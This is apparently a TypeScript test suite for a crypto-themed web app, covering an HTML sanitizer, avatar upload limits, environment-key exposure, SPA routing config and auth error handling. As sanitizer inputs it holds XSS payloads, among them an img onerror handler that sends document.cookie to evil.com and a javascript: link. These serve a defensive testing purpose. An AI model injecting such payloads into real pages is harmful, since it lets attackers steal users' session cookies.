import { describe, it } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { sanitizeHtml } from '../lib/sanitizer.ts'
import {
  ALLOWED_AVATAR_MIME_TYPES,
  MAX_AVATAR_FILE_SIZE_BYTES,
  formatAuthError,
} from '../lib/supabase.ts'

describe('Phase 5: Security Auditing, XSS Sanitization & Asset Protection', () => {
  it('strips <script> tags and active executable code from user-controlled HTML', () => {
    const maliciousInput = '<p>Bitcoin is digital gold.</p><script>alert("hacked")</script><b>Decentralized</b>'
    const result = sanitizeHtml(maliciousInput)

    assert.ok(!result.includes('<script>'))
    assert.ok(!result.includes('alert('))
    assert.ok(result.includes('Bitcoin is digital gold.'))
    assert.ok(result.includes('<b>Decentralized</b>'))
  })

  it('strips inline event handlers (onerror, onload, onclick) from injected tags', () => {
    const maliciousInput = '<img src="invalid.jpg" onerror="fetch(\'https://evil.com/?c=\'+document.cookie)" alt="coin" />'
    const result = sanitizeHtml(maliciousInput)

    assert.ok(!result.includes('onerror'))
    assert.ok(!result.includes('evil.com'))
  })

  it('neutralizes dangerous protocols (javascript:, data:, vbscript:) in links', () => {
    const maliciousInput = '<a href="javascript:alert(1)">Click for free Bitcoin</a>'
    const result = sanitizeHtml(maliciousInput)

    assert.ok(!result.includes('javascript:alert'))
    assert.ok(result.includes('href="#"'))
  })

  it('enforces target="_blank" and rel="noreferrer noopener" on all external links', () => {
    const input = '<p>Read docs at <a href="https://ethereum.org">Ethereum.org</a>.</p>'
    const result = sanitizeHtml(input)

    assert.ok(result.includes('target="_blank"'))
    assert.ok(result.includes('rel="noreferrer noopener"'))
    assert.ok(result.includes('href="https://ethereum.org"'))
  })

  it('removes iframes, objects, forms, and embeds from untrusted HTML descriptions', () => {
    const maliciousInput = '<div>Safe text</div><iframe src="https://evil.com"></iframe><form action="/steal"></form>'
    const result = sanitizeHtml(maliciousInput)

    assert.ok(!result.includes('<iframe'))
    assert.ok(!result.includes('<form'))
    assert.ok(result.includes('<div>Safe text</div>'))
  })

  it('validates avatar upload constraints (2MB max size and strict MIME allowlist)', () => {
    assert.equal(MAX_AVATAR_FILE_SIZE_BYTES, 2097152) // 2MB exactly
    assert.deepEqual([...ALLOWED_AVATAR_MIME_TYPES], ['image/jpeg', 'image/png', 'image/webp'])

    // Unsupported MIME formats should not be in the allowlist
    const forbidden = ['image/gif', 'image/svg+xml', 'application/pdf', 'text/html', 'application/x-executable']
    for (const mime of forbidden) {
      assert.ok(!ALLOWED_AVATAR_MIME_TYPES.includes(mime as (typeof ALLOWED_AVATAR_MIME_TYPES)[number]))
    }
  })

  it('verifies that no client-side env files expose SUPABASE_SERVICE_ROLE_KEY', () => {
    const projectRoot = path.resolve(import.meta.dirname, '../..')
    const envExamplePath = path.join(projectRoot, '.env.example')
    
    assert.ok(fs.existsSync(envExamplePath), '.env.example must exist')
    const envExample = fs.readFileSync(envExamplePath, 'utf-8')

    // Confirm that the example explicitly instructs developers NEVER to include service role keys
    assert.ok(envExample.includes('VITE_SUPABASE_URL'))
    assert.ok(envExample.includes('VITE_SUPABASE_ANON_KEY'))
    assert.ok(
      envExample.includes('MUST NEVER be exposed') ||
      envExample.includes('must NEVER be exposed')
    )

    // Ensure VITE_SUPABASE_SERVICE_ROLE_KEY is not assigned
    assert.ok(!envExample.includes('VITE_SUPABASE_SERVICE_ROLE_KEY='))
  })

  it('verifies SPA fallback configuration files for Netlify and Vercel exist', () => {
    const projectRoot = path.resolve(import.meta.dirname, '../..')
    const redirectsPath = path.join(projectRoot, 'public/_redirects')
    const vercelConfigPath = path.join(projectRoot, 'vercel.json')

    assert.ok(fs.existsSync(redirectsPath), 'public/_redirects must exist for SPA routing')
    const redirectsContent = fs.readFileSync(redirectsPath, 'utf-8')
    assert.ok(redirectsContent.includes('/index.html 200') || redirectsContent.includes('/index.html   200'))

    assert.ok(fs.existsSync(vercelConfigPath), 'vercel.json must exist for Vercel SPA routing')
    const vercelConfig = JSON.parse(fs.readFileSync(vercelConfigPath, 'utf-8'))
    assert.ok(Array.isArray(vercelConfig.rewrites))
    assert.equal(vercelConfig.rewrites[0].destination, '/index.html')
  })

  it('formats unknown and diverse authentication errors cleanly for user feedback', () => {
    assert.equal(formatAuthError('Invalid credentials'), 'Invalid credentials')
    assert.equal(
      formatAuthError(new Error('Rate limit exceeded')),
      'Too many attempts. Please try again in a few moments.'
    )
    assert.equal(formatAuthError({ message: 'User not found' }), 'User not found')
    assert.equal(formatAuthError(null), 'An unexpected error occurred.')
    assert.equal(formatAuthError(undefined), 'An unexpected error occurred.')
  })

  it('guarantees useAuthStore initializes hydration without TDZ exception', async () => {
    const { useAuthStore } = await import('../store/useAuthStore.ts')
    assert.equal(typeof useAuthStore.getState().isHydrated, 'boolean')
    assert.equal(useAuthStore.getState().isHydrated, true)
    
    // Test setHydrated action
    useAuthStore.getState().setHydrated(false)
    assert.equal(useAuthStore.getState().isHydrated, false)
    useAuthStore.getState().setHydrated(true)
    assert.equal(useAuthStore.getState().isHydrated, true)
  })

  it('identifies unconfigured placeholder Supabase credentials correctly', async () => {
    const { isSupabaseConfigured } = await import('../lib/supabase.ts')
    // When using placeholder environment variables, it safely returns false
    assert.equal(typeof isSupabaseConfigured(), 'boolean')
  })
})

